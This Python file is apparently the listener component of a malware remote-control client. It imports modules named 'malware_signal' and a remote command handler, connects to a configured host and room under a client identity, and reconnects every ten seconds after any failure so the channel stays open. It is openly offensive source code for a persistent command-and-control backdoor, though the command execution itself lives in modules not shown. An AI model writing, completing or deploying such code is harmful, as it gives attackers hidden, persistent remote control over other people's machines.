#command/listen/listener.py
import asyncio
from core.data.client import client_id, username
from core.data.config import ROOM, HOST
from malware_signal.signal import SignalClient
from injection_utils.remote_command_handler import RemoteCommandHandler as ReceiverHandler


async def listen_bash_mode():
    print("[+] LISTEN MODE")

    retry_delay = 10
    while True:
        signal = None
        try:
            signal = SignalClient(room=ROOM, client_id=client_id, host=HOST, username=username)
            await signal.connect()

            ReceiverHandler(signal)
            print(f"[+] LISTENING AS {username} : {client_id}")

        except KeyboardInterrupt:
            print("[+] CTRL+C PRESSED")
            break
        except asyncio.CancelledError:
            raise
        except Exception as exc:
            print(f"[!] ERROR: {exc}")
            print(f"[!] RECONNECTING IN {retry_delay} seconds")
            await asyncio.sleep(retry_delay)
        finally:
            print("[+] CLEANING UP")
            try:
                if signal:
                    await signal.close()
            except Exception as e:
                print(f"[!] ERROR: {e}")
                pass
